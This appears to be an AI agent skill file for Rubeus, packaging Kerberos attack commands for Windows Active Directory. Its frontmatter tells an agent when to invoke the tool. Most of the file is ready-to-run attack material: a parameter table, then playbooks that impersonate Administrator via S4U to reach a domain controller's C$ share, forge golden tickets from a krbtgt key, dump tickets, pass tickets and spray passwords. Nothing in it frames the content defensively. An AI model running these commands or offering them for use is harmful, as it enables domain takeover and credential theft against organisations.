---
name: rubeus-kerberos
description: "Rubeus: Forges Domain Admin tickets via S4U2Self and golden tickets. Signals: Kerberos, ticket attack, request TGT, S4U delegation, ticket renewal."
zh-signals: "Rubeus: 普通用户伪造域管票据(S4U2Self)、黄金票据恢复域管。信号:kerberos,票据攻击,请求 TGT,S4U 委派,票据续期。"
when-to-use: >-
  Use during Windows Active Directory attacks when you need to request TGTs, perform
  S4U delegation, forge golden tickets, renew or pass tickets to escalate to Domain Admin.
---

# Rubeus

- Attack Category: C26 Kerberos and Ticket Attacks
- Upstream Repository: https://github.com/GhostPack/Rubeus
- Upstream License: BSD-3-Clause(GhostPack) (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/GhostPack/Rubeus && cd Rubeus && dotnet build -c Release
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `asktgt /user:x /password:y` | Request a TGT |
| `asktgt /user:x /rc4:<hash>` | Request a TGT with a hash (PtH ticketing) |
| `s4u /ticket:<base64> /impersonateuser:admin /msdsspn:cifs/tgt` | S4U delegation |
| `dump /service:krbtgt` | Export tickets (requires elevated privileges) |
| `renew /ticket:<kirbi>` | Ticket renewal |
| `purge` | Clear the tickets in the current session |
| `brute /password:Passw0rd! /noticket` | Password spray detection |
| `tgssub /ticket:<b64> /altservice:cifs,host,http` | Ticket service name substitution (redirect to more services) |
| `monitor /interval:10` | Listen for 4624 events in real time and automatically request tickets |

## Attack Scenario Playbook

### Forge Domain Admin tickets as a normal user (S4U2Self)

```bash
Rubeus.exe asktgt /user:svc_sql /rc4:<NT> /domain:corp.local
Rubeus.exe s4u /ticket:<previous-step TGT.kirbi> /impersonateuser:Administrator /msdsspn:cifs/dc01.corp.local /ptt
dir \\dc01.corp.local\c$
```

### Recover Domain Admin with a golden ticket

```bash
Rubeus.exe golden /aes256:<krbtgt-aes> /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx
Rubeus.exe ptt /ticket:<golden.kirbi>
lsadump::dcsync can be replaced with secretsdump.py
```

## Notes

Runs on Windows; on Linux the equivalent operations use the impacket scripts. ptt = pass-the-ticket, injects the ticket into the current session.
